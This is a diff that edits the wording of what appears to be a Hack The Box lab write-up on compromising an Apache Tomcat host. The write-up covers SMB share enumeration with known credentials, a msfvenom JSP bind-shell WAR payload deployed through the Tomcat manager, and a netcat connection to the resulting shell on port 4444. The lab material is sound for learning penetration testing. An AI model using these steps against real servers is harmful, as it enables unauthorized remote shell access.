@@ -134,7 +134,7 @@ Lets begin with enumeration:
       |   date: 2026-06-21T02:31:03
       |_  start_date: N/A
 
-Looks like wever got an SMB server. Notice that it is running "Apache Tomcat", recall that we have credentials that may work here. Lets use the login info and smbclient to enumerate the shares: 
+Looks like wever got an SMB server. Also, notice that it is running "Apache Tomcat", recall that we have credentials that may work here. Lets see if we can use the login info and smbclient to enumerate the shares: 
 
       smbclient -U tomcat%Tomcatadm -L //172.16.1.11
       
@@ -152,13 +152,13 @@ As we can see, the username and passwd are allowing us to ccess the system.
 
 ## Exploit:
 
-Now lets focus on the  lets open a browser with the command:
+Now lets focus on the look at the http server on port 8080, for this we'll open a browser with the command:
 
       firefox
 
 - If you are root this may not work, in that case exit to htb-student
 
-Now navigate the the page:
+Now navigate the page at:
 
       http://172.16.1.11:8080
 
@@ -180,7 +180,7 @@ First well use msf to generate a payload.
 
       msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > file.war
 
-Now we can upload and deploy file.war. After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 
+Now we can upload and deploy file.war, if successful, it will bind a shell on port 4444. After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 
 
       nc -nv 172.16.1.11 4444
 
